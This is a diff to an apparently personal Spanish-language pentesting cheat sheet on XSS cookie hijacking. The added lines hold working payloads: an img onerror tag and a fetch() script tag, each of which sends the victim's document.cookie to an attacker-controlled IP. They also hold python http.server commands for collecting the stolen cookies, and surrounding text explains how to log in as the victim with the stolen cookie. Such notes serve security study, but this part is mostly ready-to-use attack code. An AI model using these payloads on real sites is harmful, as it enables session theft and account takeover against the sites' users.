@@ -170,13 +170,30 @@ External JavaScript Source, podemos cargar código desde un servidor externo par
 # Después de tener la 'Cookie de Session' podemos pegarla en donde se encuentra la nuestra 'sustituyendola' en la web y así cuando recarguemos la pagina, iniciaremos como el otro usuario.
 ```
 
-## Otra forma de Cookie Hijacking 
+## Cookie Hijacking 
 ```java 
 // Otra forma de mandar un script por medio de la url para robar la cookie de sesion es con la etiqueta img, cuando en la etiqueta 'HTML' no encuentre el recurso (imagen) ejecutara la parte del error. Esto es funcional cuando prohiben las etiquetas 'Javascript'
 
-<img src=x onerror=this.src='http://IP//c='%2Bdocument.cookie>
+<img src=x onerror=this.src='http://IP//?c='%2Bdocument.cookie>
 	// IP = La direccion IP del atacante 
+```
 
+```bash
+❯ python3 -m http.server 80               # Nos montamos un servidor http 80 para que la victima acceda al archivo malicioso 
+```
+
+## Cookie Hijacking
+
+```java 
+// Podemos usar este script tanto para una XSS reflejado como almacenado, utilizando el API 'fetch' de Javascript
+
+<script>fetch('http://IP/server.php?cookie='%2Bdocument.cookie)</script>
+
+	// IP = Direccion IP del atacante.
+```
+
+```bash
+❯ python -m SimpleHTTPServer               # Nos montamos un servidor http 80 para que la victima acceda al archivo malicioso 
 ```
 
 ## Victima cree un post en una web 
